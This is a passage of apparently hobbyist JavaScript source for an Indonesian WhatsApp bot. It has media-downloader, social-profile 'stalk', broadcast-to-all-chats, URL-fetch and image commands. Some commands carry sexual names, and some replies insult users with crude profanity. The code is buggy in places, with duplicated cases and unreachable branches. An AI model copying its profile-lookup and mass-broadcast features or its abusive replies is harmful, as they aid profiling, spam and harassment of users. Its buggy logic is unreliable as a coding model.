							"hydratedFooterText": `${fakeyoi}`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
itsmevall.relayWAMessage(res)
break
case 'debug2':
   res = await itsmevall.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi ${pushname} 👋,\n\n${jam} - ${week} ${weton} - ${date}`,
    "hydratedFooterText": `${fakeyoi}`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script ${fakeyoi}`,
          "url": "https://github.com/rivalgans"
        },
        "index": 0
      }
    ]
  }
}
}, {})
itsmevall.relayWAMessage(res)
break
			
              
                 break
			      case "mode":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `MODE SELF/PUBLIC`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}self`,
            buttonText: {
              displayText: `SELF MODE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}public`,
            buttonText: {
              displayText: `PUBLIC MODE`,
            },
            type: 1,
          },
        ]);
        break;
      case "grup":
        if (!mek.key.fromMe) return;
        sendButMessage(from, `GROUP SETTING`, `Silahkan pilih salah satu`, [
          {
            buttonId: `${prefix}opengc`,
            buttonText: {
              displayText: `OPEN`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}closegc`,
            buttonText: {
              displayText: `CLOSE`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}revoke`,
            buttonText: {
              displayText: `REVOKE INVITE`,
            },
            type: 1,
          },
        ]);
        break;
        
      //JCCHCCGHTHDTRSRS
      case 'twtdl': case 'twt': case 'twitterdl': case 'twitter':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
                if (!q) return reply(`*Mana link nta tot*`)
                if (!isUrl(q)) return reply(`Woi ngentod lo ngaaih link apaan gblok`)
                if (!q.includes('twitter.com')) return reply(`Woi ngentod lo ngaaih link apaan gblok`)
                await reply(mess.wait)
                xa.Twitter(`${q}`).then(async data => {
                    let txt = `*---「 TWITTER DOWNLOADER 」---*\n\n`
                    txt += `* Title :* ${data.title}\n`
                    txt += `* Type :* ${data.medias[0].extension}\n`
                    txt += `* Quality :* ${data.medias[1].quality}\n`
                    txt += `* Size :* ${data.medias[1].formattedSize}\n`
                    txt += `* Url :* ${data.url}`
                    txt += `*Mohon tunggu sebentar kak, sedang proses pengiriman...*`
                    awok = await getBuffer(data.thumbnail);
                    sendFileFromUrl(from, data.medias[0].url, '', mek)
                    sendButLocation(from, `${txt}`,`© REALZIBOT`, {jpegThumbnail:awok}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
                })
                .catch((err) => {
                    reply(`Server Sedang Erorr`)
                })
                limitAdd(sender, limit)
            break        
      case "instagram":
        if (!isUrl(args[0]) && !args[0].includes("instagram.com"))
          return reply(mess.Iv);
        if (!q) return reply("Linknya?");
        reply(mess.wait);
        hx.igdl(args[0]).then(async (result) => {
          for (let i of result.medias) {
            if (i.url.includes("mp4")) {
              let link = await getBuffer(i.url);
              itsmevall.sendMessage(from, link, video, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            } else {
              let link = await getBuffer(i.url);
              itsmevall.sendMessage(from, link, image, {
                quoted: mek,
                caption: `Type : ${i.type}`,
              });
            }
          }
        });
        break;
      case "tiktokdl":
        var gh = args.join("");
        var link = gh.split("|")[0];
        var tipe = gh.split("|")[1];
        var bv = await fetchJson(
          `https://api.dhnjing.xyz/downloader/tiktok/nowatermark?url=${link}`
        );
        if (tipe == "audio") {
          sendMediaURL(from, bv.result.media_resources.music.playUrl, "");
        }
        if (tipe == "video") {
          sendMediaURL(from, bv.result.media_resources.video.videoUrl, "");
        }
        break;
case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return grupinv('Only Owner')
       if (args.length < 1) return sendButMessage(from, `\`\`\`「 PREFIX SETTING 」\`\`\``, `Silahkan pilih salah satu`, [
          {
            buttonId: `setprefix multi`,
            buttonText: {
              displayText: `Multi Prefix`,
            },
            type: 1,
          },
          {
            buttonId: `setprefix nopref`,
            buttonText: {
              displayText: `No Prefix`,
            },
            type: 1,
          },
          {
            buttonId: `setprefix allpref`,
            buttonText: {
              displayText: `All Prefix`,
            },
            type: 1,
          },
        ], {quoted:foncevid})
           if (c === 'multi'){
              multi = true
              allpref = false
              nopref = false
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else if (c === 'nopref'){
                    multi = false
                    allpref = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                   } else if (c === 'allpref'){
                   	allpref = true
                   nopref = false
                   multi = false
                   reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    allpref = false
                    prefa = `${c}`
                    reply(`Berhasil mengubah prefix ke ${c}`)
                }
                break
      
      case "delvote":
        if (!mek.key.remoteJid) return;
        if (isVote) return reply("Tidak ada sesi Voting");
        delVote(from);
        reply("Sukses Menghapus sesi Voting Di Grup Ini");
        break;
      case "voting":
        if (!isGroupAdmins && !mek.key.fromMe) return;
        if (!isGroup) return reply(mess.only.group);
        if (isVote) return reply("Sesi Voting Sedang Berlangsung Di Grup Ini");
        if (!q)
          return reply(
            "*Voting*\n\n" +
              prefix +
              "voting @tag target | reason  | 1 (1 = 1 Menit)"
          );
        if (
          mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 ||
          mek.message.extendedTextMessage.contextInfo == null
        ) {
          let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0];
          split = args.join(" ").replace("@", "").split("|");
          if (!Number(split[2]))
            return reply(
              "masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit"
            );
          await mentions(
            "Vote " +
              "@" +
              id.split("@")[0] +
              " Di Mulai" +
              "\n\n" +
              `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,
            [id],
            true
          );
          addVote(from, split[1], split[0], split[2], reply);
        }
        break;
      case "linkwa":
        if (!q) return reply("cari group apa?");
        hx.linkwa(q).then((result) => {
          let res = "*「 _LINK WA_ 」*\n\n";
          for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`;
          }
          reply(res);
        });
        break;
     /* case "igstalk":
        if (!q) return reply("Usernamenya?");
        const tod = await fetchJson(
          `https://api.dhnjing.xyz/stalk/instagram?user=${q}`
        );
        buff = await getBuffer(tod.result.user_profile_hd);
        const tt = `*INSTAGRAM STALK*
    Username: ${tod.result.username}
    Fullname: ${tod.result.user_fullname}
    Bio: ${tod.result.user_bio}

    Jumlah postingan: ${tod.result.user_post_total}
    Following: ${tod.result.user_following}
    Follower: ${tod.result.user_followers}`;
        itsmevall.sendMessage(from, buff, image, { quoted: mek, caption: tt });
        break;*/
        case 'intakemenu':
 
 listMsg = {
 buttonText: 'INTAKE LIST',
 footerText: 'asu sangean',
 description: `select the intake menu here, use it wisely`,
 sections: [
                     {
                      "title": `Doge Bot`,
 rows: [
                          {
                             "title": "randomgirl",
                              "rowId": ""
                          },
                          {
                              "title": "vietnamesegirl",
                              "rowId": ""
                           },
                          {
                              "title": "hijabgirl",
                              "rowId": ""
                           },
                           {
                              "title": "santuy",
                              "rowId": ""
                           },
                           {
                              "title": "brosis",
                              "rowId": ""
                           },
                           {
                              "title": "small",
                              "rowId": ""
                           },
                           {
                              "title": "ghea",
                              "rowId": ""
                           },
                           {
                              "title": "rika",
                              "rowId": ""
                           },
                           {
                              "title": "ListMenu",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
itsmevall.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:mek})
break
 //━━━━━━━━━━━━━━━[ BAHAN ASUPAN ]━━━━━━━━━━━━━━━━━//
 
case 'meme':
case 'memeindo':
case 'drakjoke':
case 'drakjokes':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
reply(mess.wait)
buffer = await getBuffer(`https://api.lolhuman.xyz/api/random/meme?apikey=${lolkey}`)
buttons = [{buttonId: `meme`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
              buttonsMessage = {footerText:'©Realzibot', imageMessage: imageMsg,
              contentText:`Random Meme`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
         break;
         case 'memeindo':
case 'drakjoke':
case 'drakjokes':
         case 'darkjokes':
          if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)                        
          halo = fs.readFileSync('./lib/darkjokes.js');
	      jsonData = JSON.parse(halo);
	      randIndex = Math.floor(Math.random() * jsonData.length);
          randKey = jsonData[randIndex];
	      hasl = await getBuffer(randKey.result)  
          but = [
          { buttonId: `darkjokes`, buttonText: { displayText: 'NEXT' }, type: 1 }]
          sendButImage(from, `AhhhGelapKekMasaDepanlu`, `Klik Next Ngab`, hasl, but)   
          limitAdd(sender, limit)       
          break
case 'cecan':
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
reply(mess.wait)
buffer = await getBuffer(`https://api.zacros.my.id/asupan/cecan`)
buttons = [{buttonId: `cecan`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(buffer, "imageMessage", { thumbnail: buffer, })).imageMessage
              buttonsMessage = {footerText:'©Realzibot', imageMessage: imageMsg,
              contentText:`Cecan`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{body:"",mediaType:"2",thumbnail:getBuffer(thumb),mediaUrl:"https://youtu.be/Ejl9sLbgc1A"}}})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
        break;
      case 'tiktokstalk':
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
             if (args.length == 0) return fakegroup(`Example: ${prefix + command} marz.hiatus`)
             reply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`http://api.lolhuman.xyz/api/stalktiktok/${stalk_toktok}?apikey=${lolkey}`)
             get_result = get_result.result
             pp_tt = await getBuffer(get_result.user_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TIKTOK PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`📫 Username : ${get_result.username}\`\`\`
\`\`\`🎞 Nama : ${get_result.nickname}\`\`\`
\`\`\`📟 Pengikut : ${get_result.followers}\`\`\`
\`\`\`📮 Mengikuti : ${get_result.followings}\`\`\`
\`\`\`📚 Likes : ${get_result.likes}\`\`\`
\`\`\`📻 Video : ${get_result.video}\`\`\`
\`\`\`🗃️ Deskripsi : ${get_result.bio}\`\`\`
`
              sendButLocation(from, `${ini_txt}`,`© REALZIBOT`, {jpegThumbnail:pp_tt}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
              limitAdd(sender, limit)
              break
              case 'iguser':
              try {
              if (isBanned) return reply(mess.ban)
              if (!q) return reply('nama ig nya?')
              query = args.join(" ")
              reply(mess.wait)
              get_result = await fetchJson(`https://api.zeks.xyz/api/iguser?apikey=${zekskey}&q=${q}`)
              get_result = get_result.result
              teks = `*「 INSTAGRAM USER 」*\n\n*Hasil Pencarian : ${query}*\n\n`
              for(let i = 0; i < get_result.length; i++) {
              teks += `*Username* : ${get_result[i].username}\n*Full name*: ${get_result[i].full_name}\n*Akun private* : ${get_result[i].private_user}\n*Verified*: ${get_result[i].verified_user}\n*Link*: https://instagram.com/${get_result[i].username}\n\n`
}
              ini_buffer = await getBuffer(get_result[0].profile_pic)
              itsmevall.sendMessage(from, ini_buffer, image, { quoted: freply, caption: teks })
              } catch {
              reply(`Maaf username ${query} tidak ditemukan`)
}
              break
   case 'stalktwitter':
      case 'twitterstalk':
             if (args.length == 0) return reply(`Example: ${prefix + command} marz.hiatus`)
             reply(mess.wait)
             stalk_toktok = args[0]
             get_result = await fetchJson(`https://api.lolhuman.xyz/api/twitter/${stalk_toktok}?apikey=${lolkey}`)
             get_result = get_result.result            
             pp_tt = await getBuffer(get_result.profile_picture)
             ini_txt = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *TWITTER PROFILE*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
\`\`\`📫 Username : ${get_result.screen_name}\`\`\`
\`\`\`🎞 Nama : ${get_result.name}\`\`\`
\`\`\`📟 Deskcription : ${get_result.description}\`\`\`
\`\`\`📮 Followers : ${get_result.followers}\`\`\`
\`\`\`📚 Mengfollow : ${get_result.following}\`\`\`
\`\`\`📻 Tweet : ${get_result.tweet}\`\`\`
\`\`\`🗃️ Joined : ${get_result.joined}\`\`\`
`
              sendButLocation(from, `${ini_txt}`,`© REALZIBOT`, {jpegThumbnail:pp_tt}, [{buttonId:`${prefix}menu`,buttonText:{displayText:'MENU'},type:1}], {contextInfo: { mentionedJid: [sender, owner]}})
              limitAdd(sender, limit)
              break
  case 'nulisbuku':            
  if (isBanned) return reply(mess.ban)
            if (args.length == 0) return reply(`contoh: ${prefix + command} Vall`)
            reply(mess.wait)
            teks = args.join(" ")
            ini_buf = await getBuffer(`https://itsmevall.herokuapp.com/api/maker/nulis?apikey=${valkey}&text=${teks}`)  
buttons = [{buttonId: `${prefix}listnulis`,buttonText:{displayText: `List Nulis🔖`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(ini_buf, "imageMessage", { thumbnail: ini_buf, })).imageMessage
              buttonsMessage = {footerText:'Created By ZyyXtrime', imageMessage: imageMsg,
              contentText:`𝙅𝙖𝙣𝙜𝙖𝙣 𝙇𝙪𝙥𝙖 𝙁𝙤𝙡𝙡𝙤𝙬 𝙄𝙜 @_𝙞𝙩𝙨𝙢𝙚𝙫𝙖𝙡𝙡 ☹︎`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: ftrol})
              itsmevall.relayWAMessage(prep)
         
            break
		case 'nulis':
		        if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                if (args.length < 1) return grupinv(`teksnya mana bruh?\ncontoh ${prefix + command} ${pushname}`)
                dpuhy = args.join(' ')
               tiyo = `SILAHKAN PILIH SALAH SATU`
sendButMessage(from, tiyo, `Created By ZyyXtrime`, [
            {              
              buttonId: `${prefix}nuliskanan ${dpuhy}`,
              buttonText: {
                displayText: `KANAN`,
              },
              type: 1,
               },
          {
            buttonId: `${prefix}nuliskiri ${dpuhy}`,
            buttonText: {
              displayText: `KIRI`,
            },
            type: 1,          
          },
        ]);
        limitAdd(sender, limit)    
        break;       
        // Photo Oxy //
                case 'shadow':
                case 'cup':
                case 'cup1':
                case 'romance':
                case 'smoke':
                case 'burnpaper':
                case 'lovemessage':
                case 'undergrass':
                case 'love':
                case 'coffe':
                case 'woodheart':
                case 'woodenboard':
                case 'summer3d':
                case 'wolfmetal':
                case 'nature3d':
                case 'underwater':
                case 'golderrose':
                case 'summernature':
                case 'letterleaves':
                case 'glowingneon':
                case 'fallleaves':
                case 'flamming':
                case 'harrypotter':
                case 'carvedwood':
                if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                if (isBanned) return reply(mess.ban)
                reply (mess.wait)
                    if (args.length == 0) return reply(`Example: ${prefix + command} LoL Human`)
                    ini_txt = args.join(" ")
                  buff = await getBuffer(`https://api.lolhuman.xyz/api/photooxy1/${command}?apikey=${lolkey}&text=${ini_txt}`)
                          buttons = [{buttonId: `menu`,buttonText:{displayText: `BACK MENU`},type:1}]
              imageMsg = (await itsmevall.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'ngopi dumlu☕T', imageMessage: imageMsg,
              contentText:`Jangan Lupa Follow @callme_alya`,buttons,headerType:4}
              prep = await itsmevall.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              itsmevall.relayWAMessage(prep)
              limitAdd(sender, limit)
                    break
                    case 'arcade8bit':
                case 'battlefield4':
                case 'pubg':
                    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                    if (isBanned) return reply(mess.ban)
                    if (args.length == 0) return reply(`Example: ${prefix + command} Kurr Xd`)
                    txt1 = args[0]
                    txt2 = args[1]
                    getBuffer(`https://api.lolhuman.xyz/api/photooxy2/${command}?apikey=${lolkey}&text1=${txt1}&text2=${txt2}`).then((gambar) => {
                        itsmevall.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Nih Om`, quoted : mek})
                    })
                    limitAdd(sender, limit)
                    break
                    // Ephoto 360 //
                case 'wetglass':
                case 'multicolor3d':
                case 'watercolor':
                case 'luxurygold':
                case 'galaxywallpaper':
                case 'lighttext':
                case 'beautifulflower':
                case 'puppycute':
                case 'royaltext':
                case 'heartshaped':
                case 'birthdaycake':
                case 'galaxystyle':
                case 'hologram3d':
                case 'greenneon':
                case 'glossychrome':
                case 'greenbush':
                case 'metallogo':
                case 'noeltext':
                case 'glittergold':
                case 'textcake':
                case 'starsnight':
                case 'wooden3d':
                case 'textbyname':
                case 'writegalacy':
                case 'galaxybat':
                case 'snow3d':
                case 'birthdayday':
                case 'goldplaybutton':
                case 'silverplaybutton':
                case 'freefire':
                    if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
                    if (isBanned) return reply(mess.ban)
                    if (args.length == 0) return reply(`Example: ${prefix + command} kurr xd`)
                    ini_txt = args.join(" ")
                    getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${lolkey}&text=${ini_txt}`).then((gambar) => {
                        itsmevall.sendMessage(from, gambar, image, {thumbnail: Buffer.alloc(0), caption: `Nih Om`, quoted : mek}) 
                    })
                    limitAdd(sender, limit)
                    break
                    case 'bcgc':
					case 'bcgroup':
					case 'bcgrup':
					case 'broadcastgrup':
		if (!isOwner && !mek.key.fromMe) return  reply('Perintah ini hanya untuk moderator')
                    if (args.length < 1) return reply(`Untuk broadcast ke semua group ketik:\n${prefix}bcgroup [isi chat]`)
                    var group = await itsmevall.groupMetadata(from)
			tes = args.join(' ')
		var groupz = await itsmevall.chats.all().filter(v => v.jid.endsWith('g.us'))
                    reply(`\`\`\`[ ! ]\`\`\` Broadcast in progress! Total: ${groupz.length} groups`)
                    await ini_bc_gc_bang(tes)
					reply(`\`\`\`[ ✓ ] Success broadcast : ${groupz.length} groups\`\`\``)
					break                  
                    case 'bc2':
             if (!isOwner && !mek.key.fromMe) return  reply('Perintah ini hanya untuk moderator')
             if (args.length < 1) return reply('teks?')
             anu100 = await itsmevall.chats.all()
             if (isMedia && !itsmevall.message.videoMessage || isQuotedImage) {
             const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(itsmevall).replace('quotedM','m')).message.extendedTextMessage.contextInfo : itsmevall
             bc100 = await itsmevall.downloadMediaMessage(encmedia)
             for (let _ of anu100) {
             itsmevall.sendMessage(_.jid, bc100, image, {quoted: freply, caption: `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`})
}
             reply('Suksess broadcast')
             } else {
             for (let _ of anu100) {
             itsmevall.sendMessage(_.jid, 
			{"contentText": `*「 PESAN SIARAN BOT 」*\n\n${body.slice(4)}`,
			"footerText": '*_BROADCAST_*',
			"buttons": [
			{"buttonId": `#owner`,
			"buttonText": {"displayText": "OWNER"
			},"type": "RESPONSE"}
			], "headerType": 'LOCATION',
			locationMessage: { degreesLatitude: '',
			degreesLongitude: '',
			jpegThumbnail: ofrply,
			}}, MessageType.buttonsMessage )
}
             reply('Suksess broadcast')
}
             break         
   case 'bc':               
					itsmevall.updatePresence(from, Presence.composing)
					if (!isOwner && !mek.key.fromMe) return  reply('Perintah ini hanya untuk moderator')
					if (args.length < 1) return reply('Teksnya?')
					anu = await itsmevall.chats.all()
					if (isMedia && !mek.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							itsmevall.sendMessage(_.jid, buff, image, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							itsmevall.sendMessage(_.jid, buff, video, { viewOnce:true, caption: `${body.slice(4)}`})
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !mek.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await itsmevall.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							itsmevall.sendMessage(_.jid, buff, video, { mimetype: Mimetype.gif, quoted: finv, contextInfo: { forwardingScore: 508, isForwarded: true}, caption: `${body.slice(4)}` })
						}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break

case 'get':
          case 'fetch': //ambil dari nuru
          if (isBanned) return reply(mess.ban)
              if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
              res = await fetch(q)
              if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
              delete res
              throw `Content-Length: ${res.headers.get('content-length')}`
}
              if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
              txtx = await res.buffer()
              try {
              txtx = util.format(JSON.parse(txtx+''))
              } catch (e) {
              txtx = txtx + ''
              } finally {
              reply(txtx.slice(0, 65536) + '')
}
              break
              case 'sharelock':
              if (isBanned) return reply(mess.ban)
if (!arg) return reply(`Contoh Penggunaan ${prefix}sharelock Text`)
kntl = `${args.join(' ')}`
nama = kntl.split("|")[0];
impostor = kntl.split("|")[1];
itsmevall.sendMessage(from, {
name: nama,
address: impostor,
jpegThumbnail: fakeimage}, MessageType.liveLocation, {quoted:ftokoo})
break
case 'qrcode':
if (isBanned) return reply(mess.ban)
if (!c) return reply('Textnya mana gan? contoh .qrcode itsmevall')
reply(mess.wait)
anu = (`https://bx-hunter.herokuapp.com/api/qrcode?text=${c}&apikey=${HunterApi}`)
img = await getBuffer(anu)
itsmevall.sendMessage(from, img, image, { quoted: mek, thumbnail: fs.readFileSync('./media/oksip.jpeg')})
break
             case 'valorantbanner':
if (args.length == 0) return reply(`Teks Nya Mana ?\nContoh : ${prefix + command} Zero YT7`)
bo = args.join(" ")
reply(mess.wait)
anu = await getBuffer(`https://api.lolhuman.xyz/api/ephoto1/${command}?apikey=${apikey1}&text=${bo}`)
itsmevall.sendMessage(from, anu, image, {quoted: ftrol, caption: 'Done ' })
break
case "anal":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;        
      case "anime":
      if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
      if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
case "lesbian":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
      if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "eroneko":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
      if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
        break;
case "bj":
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (isBanned) return reply(mess.ban)
        reply(mess.wait);
        fetch(
          "https://raw.githubusercontent.com/pajaar/grabbed-results/master/pajaar-2020-gambar-anime.txt"
        )
          .then((res) => res.text())
          .then((body) => {
            let tod = body.split("\n");
            let pjr = tod[Math.floor(Math.random() * tod.length)];
            imageToBase64(pjr)
              .then((response) => {
                media = Buffer.from(response, "base64");
                itsmevall.sendMessage(from, media, image, {
                  quoted: mek,
                  caption: "NIH",
                });
              })
              .catch((error) => {
                console.log(error);
              });
          });
          limitAdd(sender, limit)
        break;
      case "anime":
        reply(mess.wait);
        fetch(
